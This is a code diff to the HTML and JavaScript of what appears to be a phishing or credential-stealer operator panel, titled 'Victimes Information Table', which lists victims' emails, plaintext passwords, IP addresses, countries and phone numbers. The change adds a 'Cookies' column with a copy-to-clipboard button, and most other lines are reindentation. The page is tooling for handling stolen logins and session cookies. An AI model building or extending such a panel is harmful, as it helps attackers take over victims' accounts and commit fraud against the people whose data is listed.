@@ -22,7 +22,7 @@
 <body>
 
   <div class="container mt-2 mb-3">
-    <h2 class="text-center mb-2">Victimes Information Table V6</h2>
+    <h2 class="text-center mb-2">Victimes Information Table v2</h2>
     <div class="d-flex justify-content-between my-3 mx-2">
       <div>
         <button id="prevBtn" class="btn btn-primary d-none">New</button>
@@ -55,6 +55,7 @@
             <th>ID</th>
             <th>Email</th>
             <th>Password</th>
+            <th>Cookies</th>
             <th>IP Address</th>
             <th>Country</th>
             <th>Phone</th>
@@ -122,6 +123,7 @@
           <td>${sanitize(user.id)}</td>
           <td class="clickable">${sanitize(user.email)}</td>
           <td class="clickable">${sanitize(user.password)}</td>
+          <td><input type="button" class="click" value="${sanitize(user.ip)}" /></td>
           <td>${sanitize(user.ip)}</td>
           <td>${sanitize(user.country)}</td>
           <td>${sanitize(user.calling_code)}</td>
@@ -165,23 +167,23 @@
       });
     });
 
-function formatUnixTimestamp(timestamp) {
-    const date = new Date(timestamp * 1000); // تحويل الثواني إلى ميللي ثانية
+    function formatUnixTimestamp(timestamp) {
+      const date = new Date(timestamp * 1000); // تحويل الثواني إلى ميللي ثانية
 
-    const year = date.getFullYear();
-    const month = String(date.getMonth() + 1).padStart(2, '0'); // إضافة صفر إذا كان الشهر أقل من 10
-    const day = String(date.getDate()).padStart(2, '0');
+      const year = date.getFullYear();
+      const month = String(date.getMonth() + 1).padStart(2, '0'); // إضافة صفر إذا كان الشهر أقل من 10
+      const day = String(date.getDate()).padStart(2, '0');
 
-    const hours = String(date.getHours()).padStart(2, '0');
-    const minutes = String(date.getMinutes()).padStart(2, '0');
-    const seconds = String(date.getSeconds()).padStart(2, '0');
+      const hours = String(date.getHours()).padStart(2, '0');
+      const minutes = String(date.getMinutes()).padStart(2, '0');
+      const seconds = String(date.getSeconds()).padStart(2, '0');
 
-    return `${year}-${month}-${day} ${hours}:${minutes}:${seconds}`;
-}
+      return `${year}-${month}-${day} ${hours}:${minutes}:${seconds}`;
+    }
 
-// مثال:
-const unixTime = 1743498911;
-console.log(formatUnixTimestamp(unixTime));
+    // مثال:
+    const unixTime = 1743498911;
+    console.log(formatUnixTimestamp(unixTime));
 
 
     function addStatusChangeListeners() {
@@ -274,14 +276,21 @@ console.log(formatUnixTimestamp(unixTime));
                     () => {
                       navigator.clipboard.writeText(cell.textContent);
                   });
+                
+                document.querySelectorAll('input.click').forEach(cell => {
+                cell.addEventListener('click', () => {
+                      navigator.clipboard.writeText(cell.value);
+                  });
               });
-        }
+          })
+      }
+    }
 
-        prevBtn.addEventListener('click', () => {
-          if (page > 0) fetchUserData(--page, filter);
-      });
-      nextBtn.addEventListener('click', () => {
-        fetchUserData(++page, filter);
+    prevBtn.addEventListener('click', () => {
+      if (page > 0) fetchUserData(--page, filter);
+    });
+    nextBtn.addEventListener('click', () => {
+      fetchUserData(++page, filter);
     });
 
     document.addEventListener('DOMContentLoaded', () => {
